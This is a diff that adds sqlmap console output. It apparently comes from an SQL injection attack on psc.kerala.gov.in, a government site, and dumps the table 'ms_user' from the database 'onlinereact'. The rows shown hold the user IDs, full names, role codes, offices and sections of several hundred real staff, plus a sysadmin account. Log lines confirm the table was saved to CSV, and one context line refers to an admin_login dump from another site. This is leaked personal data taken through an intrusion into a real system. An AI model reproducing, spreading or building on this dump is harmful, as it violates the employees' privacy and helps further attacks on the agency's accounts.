@@ -59,3 +59,273 @@ Table: admin_login
 [01:46:28] [INFO] fetched data logged to text files under '/var/root/.local/share/sqlmap/output/drbcbe.in'
 
 
+ psc.kerala.gov.in
+Database: onlinereact
+Table: ms_user
+[875 entries]
++----------+---------+---------+------------+-----------+---------------------------+-------------+--------------+
+| user_id  | role_cd | wing_cd | entry_dt   | office_cd | user_name                 | user_status | section_name |
++----------+---------+---------+------------+-----------+---------------------------+-------------+--------------+
+[13:47:03] [WARNING] console output will be trimmed to last 256 rows due to large table size
+| 713639   | AT      | RCT     | 2023-06-27 | 06        | SINDHUMOL K V             | A           | QR-I         |
+| 713793   | AT      | RCT     | 2022-05-25 | 04        | Rauof M                   | A           | ROD-III      |
+| 715168   | AT      | RGR     | 2022-06-27 | 01        | Rakhee K S                | A           | GR-V         |
+| 715279   | AT      | RNA     | 2022-05-18 | 01        | Bindu B S                 | A           | Website      |
+| 715338   | AT      | SVN     | 2022-07-04 | <blank>   | Mini Renu I               | A           | AA&VW-I      |
+| 715339   | AT      | SSH     | 2022-10-20 | 01        | Shajila S                 | A           | SS-III       |
+| 715340   | AT      | EXM     | 2023-02-21 | 01        | Naseera Beevi S           | A           | EF-I         |
+| 715344   | AT      | SSD     | 2022-10-25 | 05        | BINDU S                   | A           | DTE-SS       |
+| 715345   | AT      | EXR     | 2022-12-15 | 01        | AJITHA V                  | A           | ER-IVA       |
+| 715457   | AT      | EXR     | 2022-09-16 | 01        | SABU P                    | A           | ER-VIII      |
+| 716493   | AT      | SSD     | 2022-05-21 | 17        | Rajeesh A K               | A           | C-III        |
+| 717651   | AT      | EXR     | 2023-06-03 | 01        | Sreelal J R               | A           | ER-VI        |
+| 717759   | TP      | SVD     | 2023-04-01 | 17        | PRASANTH K K              | A           | C VII        |
+| 719530   | AT      | SSD     | 2022-05-20 | 07        | Shyni J                   | A           | <blank>      |
+| 719554   | AT      | UFR     | 2022-05-18 | 01        | Bincemon Kuruvila         | A           | UFR-1        |
+| 719912   | AT      | RCT     | 2022-11-05 | 16        | Vineetha V K              | A           | WR-II        |
+| 719928   | AT      | SVD     | 2023-02-02 | 13        | Pratheesh M               | A           | P VII        |
+| 719992   | AT      | SSD     | 2022-11-14 | 09        | RENJU S                   | A           | K-VI         |
+| 721409   | AT      | RCT     | 2022-05-25 | 18        | Ramya M P                 | A           | KGD-I        |
+| 721460   | AT      | EXR     | 2022-08-17 | 01        | Soumya S S (Jr.)          | A           | ER-IVB       |
+| 722505   | AT      | RCT     | 2022-06-09 | 15        | Nithya K N                | A           | D-II         |
+| 723982   | AT      | RLR     | 2023-07-05 | 01        | JOSE K JOHN               | A           | LR-I         |
+| 726081   | AT      | OXM     | 2022-05-19 | 01        | Aneesh K                  | A           | OLE          |
+| 726167   | AT      | EXM     | 2023-06-26 | 01        | AUSTIN L                  | A           | EF-III       |
+| 730055   | AT      | RAD     | 2022-11-01 | 01        | SHAMNA S                  | A           | R-IB         |
+| 731347   | AT      | SSD     | 2022-06-25 | 12        | Chandrika Balachandran    | A           | R-III        |
+| 732204   | AT      | SSD     | 2022-05-24 | 15        | Harshad E P               | A           | DSS-II       |
+| 733322   | AT      | EXD     | 2022-05-19 | <blank>   | DHANESH M                 | A           | C-IV         |
+| 735147   | AT      | ESD     | 2022-06-23 | <blank>   | Hari E D                  | A           | R-II         |
+| 735148   | AT      | RLR     | 2022-06-07 | <blank>   | Muhammad Ansar K K        | A           | LR-I         |
+| 735152   | AT      | RGR     | 2022-05-18 | 01        | Teena V S                 | A           | GR-IA        |
+| 735231   | AT      | RCT     | 2022-11-14 | 04        | Zakariya Shareef K        | A           | ROD-III      |
+| 735280   | AT      | RCT     | 2023-05-08 | 13        | Sajeev S                  | A           | P-II         |
+| 735711   | AT      | RCT     | 2023-05-12 | 02        | Jalaja Kumari A           | A           | KLR III      |
+| 735719   | AT      | EXR     | 2022-08-24 | 01        | VIBIN M                   | A           | ER-VIII      |
+| 735990   | AT      | RGR     | 2022-05-18 | 01        | Irshad S                  | A           | GR-VIII      |
+| 736302   | AT      | EXR     | 2023-05-09 | 01        | JITHIN JOSE               | A           | ER-IIA       |
+| 736615   | AT      | RCT     | 2022-05-26 | 07        | JISHA RACHEL GEORGE       | A           | PTA-IV       |
+| 739819   | AT      | RGR     | 2023-05-15 | 01        | VISHNU V MOHAN            | A           | GR-IC        |
+| 740070   | AT      | RSR     | 2022-08-05 | 01        | Sangeetha R P             | A           | SR-I         |
+| 743409   | AT      | SSD     | 2022-05-25 | 10        | Anu K B                   | A           | ID-C         |
+| 749400   | AT      | SVD     | 2022-05-19 | 02        | Vipin Wilfred             | A           | KLR V        |
+| 749444   | AT      | RCT     | 2022-05-19 | 18        | Vipin T P                 | A           | KGD-I        |
+| 749936   | AT      | RCT     | 2022-07-08 | 15        | Biji S                    | A           | D-II         |
+| 750768   | AT      | SSD     | 2023-02-14 | 09        | Nidhin S                  | A           | <blank>      |
+| 751464   | AT      | SSD     | 2023-07-14 | 17        | Janeesh N G               | A           | C-VI         |
+| 752043   | AT      | RCT     | 2022-06-06 | 05        | Jayadev V                 | U           | DTG          |
+| 752176   | AT      | RCT     | 2022-06-21 | 08        | Syam Mohan M              | A           | AR-I         |
+| 752181   | AT      | EXR     | 2022-06-10 | <blank>   | Manu S Nellickal          | A           | <blank>      |
+| 752546   | AT      | RCT     | 2023-06-23 | 02        | SARAL M                   | A           | KLR IV       |
+| 754149   | AT      | RCT     | 2022-08-24 | 15        | SMITHA P                  | A           | D-II         |
+| 754596   | AT      | EXR     | 2022-05-19 | 01        | Amina Beevi A R           | A           | ER-IX        |
+| 755194   | AT      | ADL     | 2023-03-17 | 01        | SAILESWARY PILLAI         | A           | <blank>      |
+| 755818   | AT      | SSD     | 2022-05-21 | 18        | Divya K V                 | A           | KGD-III      |
+| 758060   | AT      | RCT     | 2023-06-03 | 10        | Josena Francis            | A           | ID-E         |
+| 758258   | PG      | GEN     | 2022-06-06 | 01        | RIYAS E                   | A           | <blank>      |
+| 759531   | AT      | SSD     | 2022-09-16 | 15        | Rayhanath Ambalapally     | A           | DSS-II       |
+| 760283   | AT      | RCT     | 2022-05-19 | 05        | Renjith S                 | A           | DTD          |
+| 761392   | AT      | RCT     | 2022-06-28 | 02        | Jincy Dunstan             | A           | <blank>      |
+| 762097   | AT      | RCT     | 2022-05-19 | 08        | RESHMA R MOHAN            | A           | AR-II        |
+| 762619   | SO      | RGR     | 2022-05-30 | 01        | Babuji B V                | A           | GR-IIB       |
+| 762693   | AT      | RGR     | 2022-06-06 | 01        | Anoop Krishnan            | A           | GR-V         |
+| 762698   | AT      | RGR     | 2023-03-15 | 01        | Aneesh V S                | A           | GR-IVB       |
+| 763549   | AT      | SSD     | 2022-05-19 | 13        | PRIYA K                   | A           | P-VI         |
+| 763892   | AT      | RCT     | 2022-05-21 | 10        | BIJIMOL P J               | A           | ID-B         |
+| 764805   | SO      | UFR     | 2022-05-19 | 01        | Sajin Lal J               | A           | UFR - II     |
+| 764852   | AT      | EXR     | 2023-02-28 | 01        | SINDHU R.                 | A           | ER-II        |
+| 765238   | AT      | RCT     | 2022-05-27 | 08        | SINCYMOL ANTONY           | A           | AR-I         |
+| 766215   | AT      | SSH     | 2023-05-20 | 01        | Aswathy P S               | A           | SS-III       |
+| 766949   | AT      | RCT     | 2022-05-20 | 07        | Binoy C                   | A           | PTA-IV       |
+| 767345   | AT      | RCT     | 2023-03-28 | 12        | Anitha N M                | A           | R-I          |
+| 767361   | AT      | EXR     | 2022-08-22 | 01        | Sandeep P                 | A           | ER-III       |
+| 767904   | AT      | SSD     | 2022-06-24 | 13        | Aswathy P                 | A           | P-III        |
+| 769022   | SO      | RCT     | 2023-02-08 | 07        | Soumya Sadanandan         | A           | PTA-IV       |
+| 769597   | AT      | SSD     | 2022-05-18 | 06        | ARYA A                    | A           | QSS-I        |
+| 769811   | AT      | RCT     | 2022-06-03 | 02        | PRAGEETHA G               | A           | KLR IV       |
+| 769883   | AT      | RCT     | 2022-06-07 | 14        | BUSHRA C V                | A           | MR III       |
+| 769912   | AT      | RGR     | 2023-07-03 | 01        | SHINCE MATHEW A           | A           | GR-IIA       |
+| 770367   | AT      | SSD     | 2023-05-29 | 07        | Binu Soman                | A           | PTA-III      |
+| 772286   | AT      | RCR     | 2022-05-24 | 01        | Deepa Prabhakaran         | A           | CRII         |
+| 772653   | AT      | RCT     | 2022-11-18 | 04        | Hasna E                   | A           | ROD-III      |
+| 773514   | AT      | EXR     | 2022-11-22 | 01        | Shibi Francis             | A           | ER-IIA       |
+| 773623   | AT      | EXR     | 2022-10-01 | 01        | Remya K                   | A           | ER-IX        |
+| 774363   | AT      | ACT     | 2022-05-19 | <blank>   | Anil V                    | A           | <blank>      |
+| 775580   | AT      | RAD     | 2023-04-26 | 01        | SABNA S                   | A           | R-IC         |
+| 776589   | AT      | RCT     | 2022-05-25 | 12        | Bineesh C B               | A           | R-IV         |
+| 777603   | AT      | SSH     | 2022-09-20 | 01        | Swathi Sundar U           | A           | SS-VI        |
+| 778164   | AT      | EXR     | 2022-06-06 | 01        | PRASEEDA K LAKSHMANAN     | A           | OSM          |
+| 778443   | AT      | RCT     | 2023-06-02 | 10        | Arun Kumar Mohanan        | A           | ID-E         |
+| 780604   | AT      | RGR     | 2023-02-04 | 01        | LIZY J P                  | A           | GR-X         |
+| 780899   | AT      | RCT     | 2022-05-20 | 05        | Salini N A                | A           | DTG          |
+| 781179   | AT      | RCT     | 2022-05-19 | 12        | MANU K V                  | A           | R-I          |
+| 782196   | AT      | RSR     | 2022-05-19 | 01        | Sruthi P R                | A           | SR-II        |
+| 783180   | AT      | EXD     | 2022-05-19 | 17        | Nirmal P K                | A           | C-IV         |
+| 783237   | AT      | UFR     | 2022-08-25 | 01        | SYAM KUMAR S              | A           | UFR - II     |
+| 783459   | AT      | RCT     | 2023-04-26 | 06        | ROHINI SUDARSANAN         | A           | QR-I         |
+| 783511   | AT      | RCT     | 2022-06-20 | 14        | Fasna C                   | A           | MR II        |
+| 783513   | AT      | EXR     | 2023-01-09 | 01        | Naveena Ishak             | A           | ER-XV        |
+| 783533   | AT      | RGR     | 2022-05-18 | <blank>   | REECY DAS S S             | A           | GR-IIA       |
+| 783657   | AT      | SSH     | 2022-11-30 | 01        | Nijil K                   | A           | SS-III       |
+| 783914   | AT      | RCT     | 2023-06-23 | 11        | Anu N V                   | A           | E-III        |
+| 784279   | AT      | SSD     | 2023-01-07 | 09        | JITH JOSE KURIAN          | A           | K-V          |
+| 784949   | AT      | RCT     | 2022-06-02 | 16        | SUNEESH VINCENT           | A           | WR-II        |
+| 786253   | AT      | SSD     | 2022-07-05 | 05        | MARGARAT JOSE             | A           | DTF-SS       |
+| 787486   | AT      | EXR     | 2022-05-19 | 01        | SREEJITH VISHNU S         | A           | ER-IIA       |
+| 787573   | AT      | RGR     | 2022-05-26 | 01        | Akhil A G                 | A           | GR-IIA       |
+| 787770   | AT      | DEW     | 2023-05-20 | 01        | SREEJA P S                | A           | DE-VI        |
+| 790553   | TP      | RCT     | 2023-07-25 | 09        | USHA M                    | A           | K-III        |
+| 791798   | AT      | RGR     | 2022-05-26 | 01        | Melba Varghese            | A           | GR-IX        |
+| 792697   | AT      | SSD     | 2022-06-13 | 14        | Shahanas K                | A           | MSS II       |
+| 795190   | AT      | RCT     | 2022-06-02 | 18        | Sameera K M               | A           | KGD-IV       |
+| 798477   | TP      | RCT     | 2022-05-21 | <blank>   | nizhad a                  | A           | <blank>      |
+| 799255   | AT      | SSH     | 2022-05-25 | 01        | NIKITHA G SUDHAKAR        | A           | SS-V         |
+| 799459   | AT      | EXR     | 2022-10-12 | 01        | Jooly P S                 | A           | ER-XV        |
+| 799717   | AT      | RCT     | 2022-06-03 | 14        | MANSOORKHAN M             | A           | MR II        |
+| 799782   | PG      | GEN     | 2022-05-18 | 01        | LEKSHMY R S               | A           | <blank>      |
+| 800130   | AT      | RGR     | 2023-06-26 | 01        | BINILA D B S              | A           | GR-VII       |
+| 801315   | AT      | SSH     | 2022-06-10 | 01        | Sumi K P                  | A           | SS-V         |
+| 802103   | AT      | EXM     | 2022-05-19 | 01        | CHITHRA P V               | A           | EF-I         |
+| 803861   | AT      | DEW     | 2023-06-09 | 01        | Mohana Kumari K.          | A           | DE-II        |
+| 806536   | AT      | SSD     | 2023-02-14 | 09        | Poornima A O              | A           | K-V          |
+| 806576   | AT      | RCT     | 2022-06-13 | <blank>   | Salih K                   | U           | <blank>      |
+| 806588   | AT      | EXD     | 2022-05-21 | 16        | ARUN JOSE                 | A           | WEP          |
+| 806594   | AT      | RLR     | 2022-05-26 | 01        | Hakkim Sha M              | A           | LR-II        |
+| 806595   | AT      | RCT     | 2022-05-20 | 12        | MANOJ P.H.                | A           | R-I          |
+| 806598   | AT      | RCR     | 2022-05-19 | 01        | JITHIN KURIAN             | A           | CRII         |
+| 806611   | AT      | RCT     | 2022-05-19 | 05        | Remya Mol R S             | A           | DTB          |
+| 806615   | AT      | RCT     | 2022-08-03 | <blank>   | SUNU A                    | U           | DTB          |
+| 806747   | AT      | EXR     | 2022-05-20 | 01        | Sajini P                  | A           | ER-XVI       |
+| 806748   | AT      | SSD     | 2022-05-19 | 13        | PRIJITHA K                | A           | P-VI         |
+| 806753   | AT      | RGR     | 2022-06-02 | 01        | Shemeena P H              | A           | GR-IC        |
+| 806950   | AT      | RGR     | 2022-06-03 | 01        | Revathy T R               | A           | GR-IIIA      |
+| 807172   | AT      | RCT     | 2022-06-04 | 14        | SHARAFUDHEEN B K          | A           | MR III       |
+| 807379   | AT      | SSH     | 2022-08-05 | <blank>   | ABHILASH K.G.             | A           | SS-VI        |
+| 807381   | AT      | SSD     | 2022-05-24 | 13        | RATHIKUMAR  P.            | A           | P-VI         |
+| 807384   | AT      | RSR     | 2022-05-19 | 01        | SOUMYA A.M.               | A           | SR-II        |
+| 808139   | TP      | RCT     | 2023-07-25 | 06        | SAJAYAN G                 | A           | QR-III       |
+| 808226   | AT      | EXR     | 2022-05-25 | 01        | GEETHALEKSHMI S           | A           | ER XIV       |
+| 808229   | AT      | RCT     | 2022-05-27 | 14        | Mujeebu Rahiman A         | A           | MR III       |
+| 810996   | AT      | SSD     | 2023-04-03 | 17        | Dilna V P                 | A           | C-VI         |
+| 811896   | AT      | RCT     | 2022-09-13 | 05        | RAGAM T R                 | A           | DTC          |
+| 813400   | AT      | EXR     | 2023-05-08 | 01        | Geetha C P                | A           | ER-IV        |
+| 816564   | AT      | RGR     | 2022-05-26 | 01        | SAUMYA K S                | A           | GR-IX        |
+| 817027   | AT      | RCT     | 2022-05-21 | 10        | Ajeesh P U                | A           | ID-B         |
+| 818937   | AT      | SSD     | 2022-05-23 | 05        | Alen Ashish P             | A           | DTF-SS       |
+| 820380   | TP      | SVD     | 2022-05-20 | 09        | Binny K C                 | A           | <blank>      |
+| 820529   | AT      | RAD     | 2022-05-23 | 01        | Harikrishnan G R          | A           | R-IE         |
+| 821735   | AT      | SSD     | 2022-11-10 | 05        | REKHA V S                 | A           | DTF-SS       |
+| 822527   | TP      | ADL     | 2022-12-02 | 01        | Vijeesh m                 | A           | A-IX         |
+| 822570   | AT      | EXR     | 2023-08-22 | 01        | Suchithra V               | A           | ER-III       |
+| 823459   | AT      | EXR     | 2022-05-18 | 01        | Anitha K M                | A           | ER-II        |
+| 826747   | AT      | SSD     | 2022-05-24 | <blank>   | Anju S                    | A           | P-III        |
+| 827138   | AT      | IDS     | 2022-05-21 | 01        | REMYA VASUDEVAN           | A           | IDS-I        |
+| 827678   | AT      | RGR     | 2022-06-08 | 01        | Aswathy R S               | A           | GR-VI        |
+| 827685   | AT      | RAD     | 2022-05-19 | 01        | SUMITHRA S R              | A           | R-ID         |
+| 827694   | AT      | SSD     | 2022-05-20 | 08        | Gopikrishnan G            | A           | ASS-I        |
+| 829005   | AT      | RCT     | 2022-05-19 | 09        | Ullas Mathew Joseph       | A           | K-III        |
+| 831216   | AT      | EXR     | 2023-07-31 | 01        | Asha L                    | A           | ER-IX        |
+| 839299   | AT      | RSR     | 2022-06-01 | 01        | Parvathy C                | A           | SR-III       |
+| 839516   | AT      | RCT     | 2022-05-20 | 10        | Geethumol Sudhakaran      | A           | ID-E         |
+| 839879   | AT      | EXR     | 2023-05-20 | 01        | SWATHILAKSHMI T S         | A           | ER-IX        |
+| 840338   | AT      | COE     | 2022-09-12 | 01        | Vishnu R J                | A           | <blank>      |
+| 841709   | AT      | RCS     | 2022-05-23 | <blank>   | RINI MARY CHERIAN         | A           | CS           |
+| 843360   | TP      | SVD     | 2022-05-20 | <blank>   | Jithesh Mohan             | A           | RE I         |
+| 843697   | AT      | RCT     | 2023-06-01 | 17        | Preethi E                 | A           | C-I          |
+| 844792   | AT      | SSD     | 2022-05-19 | 14        | YASIR C                   | A           | MSS II       |
+| 845057   | AT      | RSR     | 2022-05-24 | 01        | Vishnu R S                | A           | SR-III       |
+| 847150   | AT      | RCS     | 2022-05-24 | <blank>   | Shamnas M N               | A           | CS           |
+| 849062   | AT      | EXR     | 2022-08-24 | 01        | Remya G R                 | A           | ER-XV        |
+| 851800   | AT      | RCT     | 2022-05-19 | 11        | SREEDEV M S               | A           | E-II         |
+| 853120   | AT      | SSD     | 2022-10-11 | 15        | Jincy N P                 | A           | DSS-II       |
+| 853761   | AT      | SSD     | 2022-11-10 | 14        | Sanoop T                  | A           | MSS I        |
+| 855276   | AT      | RCT     | 2022-05-24 | 05        | SIVANYA C M               | A           | DTB          |
+| 855432   | AT      | SSD     | 2022-09-14 | 18        | SREESHA M V               | A           | KGD-III      |
+| 855733   | AT      | SVD     | 2022-11-10 | 16        | Samini K J                | A           | WSV          |
+| 856534   | AT      | SSD     | 2022-09-22 | 12        | Aswan C C                 | A           | R-III        |
+| 858797   | AT      | SSD     | 2022-11-08 | 15        | Remya C S                 | A           | DSS-I        |
+| 859007   | AT      | RCT     | 2023-05-05 | 05        | Ajith Raj P K             | A           | DTC          |
+| 859465   | AT      | RCT     | 2022-06-17 | 09        | Prathibha A               | A           | K-III        |
+| 860547   | AT      | SSH     | 2022-08-05 | <blank>   | Bindhu C                  | A           | SS-IV        |
+| 860876   | AT      | IDS     | 2023-06-15 | 01        | Anand S                   | A           | IDS-I        |
+| 863109   | AT      | EXR     | 2023-02-24 | 01        | SHAFEEK R                 | A           | ER-XIII      |
+| 863156   | AT      | RGR     | 2022-06-04 | 01        | Aswathy S                 | A           | GR-IIIA      |
+| 863163   | AT      | SSD     | 2022-06-23 | 09        | Unnikrishnan V            | A           | K-VI         |
+| 867549   | AT      | SSD     | 2022-05-20 | 12        | Reshma P R                | A           | R-VI         |
+| 867960   | AT      | IDS     | 2022-05-18 | <blank>   | Resal Mani                | A           | IDS-I        |
+| 868026   | AT      | RGR     | 2022-05-26 | 01        | Arun V R                  | A           | GR-IIA       |
+| 868055   | AT      | RCT     | 2022-06-25 | 15        | RANJISH V K               | A           | D-V          |
+| 868718   | AT      | RCT     | 2022-05-19 | 18        | Sharath S                 | A           | KGD-I        |
+| 870264   | AT      | SSD     | 2022-05-19 | 16        | Shidhin A                 | A           | W-SS         |
+| 870664   | AT      | ADL     | 2022-05-23 | 01        | Nitish B R                | A           | A-VI         |
+| 870821   | AT      | RCT     | 2023-01-20 | 10        | Unnikuttan K J            | A           | ID-B         |
+| 872576   | AT      | SSH     | 2022-06-04 | 01        | Nidhin Chandran           | A           | SS-VI        |
+| 872954   | AT      | EXR     | 2022-07-27 | 01        | Anoop Stephen             | A           | ER-VIII      |
+| 874873   | AT      | RLR     | 2022-06-02 | 01        | VINEETHA V I NAIR         | A           | LR-I         |
+| 874906   | AT      | RCT     | 2023-05-16 | 09        | MATHEWS PHILIP            | A           | K-II         |
+| 876660   | AT      | SVD     | 2022-05-19 | <blank>   | Devu M S                  | A           | DTS          |
+| 876695   | AT      | SSD     | 2023-01-16 | 12        | PARVATHY C                | A           | R-VI         |
+| 876701   | AT      | RSR     | 2022-08-05 | 01        | Manjusha V P              | A           | SR-III       |
+| 877181   | AT      | SVD     | 2022-11-21 | 14        | Mohamed Riyas K K         | A           | MVW          |
+| 877464   | AT      | RCS     | 2022-05-18 | <blank>   | Saritha L R               | A           | CS           |
+| 879738   | AT      | SSD     | 2022-06-07 | 14        | Muhammed Ashraf N         | A           | MSS I        |
+| 879997   | AT      | SSD     | 2022-06-28 | 06        | Geethu S R                | A           | QSS-I        |
+| 883226   | AT      | SSD     | 2022-09-15 | 15        | Deepa A T                 | A           | DSS-II       |
+| 888858   | AT      | RGR     | 2022-06-04 | <blank>   | Sarah M                   | A           | GR-IIIA      |
+| 890232   | AT      | RGR     | 2022-05-18 | 01        | JERIS JOSE                | A           | GR-IC        |
+| 890233   | AT      | EXR     | 2022-08-22 | 01        | SAYONA P O                | A           | ER-XIII      |
+| 890402   | AT      | RCT     | 2023-05-16 | 11        | Roshni P Raj              | A           | E-II         |
+| 891198   | AT      | SVD     | 2022-05-18 | <blank>   | Nijeesh M K               | A           | D-III        |
+| 891340   | SO      | EXR     | 2022-08-05 | <blank>   | Salini R                  | A           | ER-IV        |
+| 891511   | AT      | SSD     | 2022-08-24 | 07        | Vishnu V                  | A           | <blank>      |
+| 892423   | AT      | RLR     | 2022-05-18 | 01        | Aisha S                   | A           | LR-II        |
+| 892427   | AT      | EXR     | 2022-08-05 | <blank>   | Ajeethy S                 | A           | ER-XVI       |
+| 894739   | AT      | EXD     | 2023-07-04 | 18        | RAMYA K R                 | A           | KGD-V        |
+| 894765   | AT      | SSD     | 2022-07-11 | 15        | Reeshma Ajosh             | A           | DSS-I        |
+| 895062   | AT      | SSD     | 2022-06-06 | 12        | Raina Rahim P A           | A           | R-III        |
+| 895172   | AT      | RCT     | 2022-05-27 | 07        | Girish Chandran           | A           | PTA-II       |
+| 895176   | AT      | RCT     | 2023-04-04 | 08        | Neethu B Bose             | A           | AR-I         |
+| 895335   | AT      | RCT     | 2022-05-25 | 12        | Muhammed Sabith V J       | A           | R-IV         |
+| 900978   | AT      | SSD     | 2022-05-19 | 10        | Nidheesh M R              | A           | ID-C         |
+| 905719   | PG      | GEN     | 2022-06-29 | 01        | Sreejith C R              | A           | EDP          |
+| 908281   | AT      | SVD     | 2022-05-19 | <blank>   | Shinoj K A                | A           | R VII        |
+| 910354   | TP      | ESD     | 2022-05-19 | <blank>   | Neethu G Lawrence         | A           | M ESTT       |
+| 913704   | AT      | SVD     | 2022-05-25 | 10        | NAYANA P J                | A           | IDF          |
+| 914529   | AT      | RCT     | 2022-08-05 | 13        | Prasanthi C               | A           | P-IV         |
+| 914530   | AT      | IDS     | 2022-05-19 | <blank>   | Dhanya Theresa Andrews    | A           | IDS-II       |
+| 915720   | AT      | SSD     | 2022-06-18 | 05        | Rekha P                   | A           | DTF-SS       |
+| 915852   | AT      | RDR     | 2022-08-05 | 01        | Vaisaly                   | A           | DR-III       |
+| 915881   | TP      | SSD     | 2022-05-20 | <blank>   | Sharafali K               | A           | MSS I        |
+| 915882   | AT      | RCT     | 2022-05-21 | 05        | Ajimsha Rasheed           | A           | DTC          |
+| 916110   | AT      | SSD     | 2022-08-24 | 07        | Raghul R                  | A           | <blank>      |
+| 916815   | AT      | EXD     | 2022-11-05 | 07        | Bonymon Scariah           | A           | PTA-V        |
+| 917537   | AT      | ESD     | 2023-02-06 | 14        | Sajeesh C                 | A           | M ESTT       |
+| 922747   | AT      | RCT     | 2022-06-23 | 16        | Laya E J                  | A           | WR-I         |
+| 924808   | AT      | RGR     | 2022-05-20 | 01        | Varna B S                 | A           | GR-IIC       |
+| 928511   | AT      | RCR     | 2022-05-23 | 01        | Akarsh K Sasi             | A           | CRI          |
+| 929952   | AT      | RCT     | 2023-04-26 | 04        | Sheeja M                  | A           | ROD-III      |
+| 931344   | AT      | SSD     | 2023-07-31 | 18        | Krishanth P V             | A           | KGD-III      |
+| 931578   | AT      | RGR     | 2022-06-08 | 01        | Prasad U                  | A           | GR-VII       |
+| 932705   | SA      | GEN     | 2022-10-15 | 01        | Mahesh Mohan              | A           | EDP          |
+| 932823   | AT      | RGR     | 2022-06-08 | 01        | Sunaina S S               | A           | GR-VI        |
+| 933044   | AT      | EXR     | 2022-06-30 | <blank>   | Ashna R Thulasi           | A           | ER-VI        |
+| 933134   | AT      | RCT     | 2022-05-21 | 07        | Vincy Baby                | A           | PTA-IV       |
+| 935602   | TP      | RCT     | 2023-01-25 | 07        | Ajina Mohamed Thasim      | A           | PTA-II       |
+| 943881   | AT      | RNA     | 2023-08-14 | 01        | YESUDAS A                 | A           | Website      |
+| 945273   | AT      | RGR     | 2023-07-07 | 01        | Harikrishnan A            | A           | GR-IIIA      |
+| 945696   | AT      | RCT     | 2023-07-25 | 05        | Nishad Lalu Mannakudavan  | A           | DTD          |
+| 948137   | AT      | RGR     | 2023-07-29 | 01        | Jaisil P Azeez            | A           | GR-IVB       |
+| 949784   | AT      | RGR     | 2023-06-14 | 01        | Krishna Prasad T M        | A           | GR-V         |
+| 953536   | AT      | SVD     | 2023-06-09 | 10        | Santhi Swaroop S R        | A           | IDF          |
+| 953729   | AT      | RGR     | 2023-07-26 | 01        | Shana Shaji               | A           | GR-VI        |
+| 953730   | AT      | RGR     | 2023-07-01 | 01        | Varun Jayachandran        | A           | GR-IIA       |
+| 953737   | AT      | RGR     | 2023-07-13 | 01        | Sarath S Nair             | A           | GR-IIC       |
+| 953828   | AT      | EXR     | 2023-07-31 | 01        | Dharsan S                 | A           | ER-IIA       |
+| 954404   | AT      | EXR     | 2023-06-23 | 01        | Ardhra B P                | A           | ER-XV        |
+| sysadmin | SU      | GEN     | 2022-05-17 | 01        | Super User                | A           | <blank>      |
++----------+---------+---------+------------+-----------+---------------------------+-------------+--------------+
+
+[13:47:03] [INFO] table 'onlinereact.ms_user' dumped to CSV file '/var/root/.local/share/sqlmap/output/psc.kerala.gov.in/dump/onlinereact/ms_user.csv'
+[13:47:03] [INFO] fetched data logged to text files under '/var/root/.local/share/sqlmap/output/psc.kerala.gov.in'
+
+[*] ending @ 13:47:03 /2023-09-13/
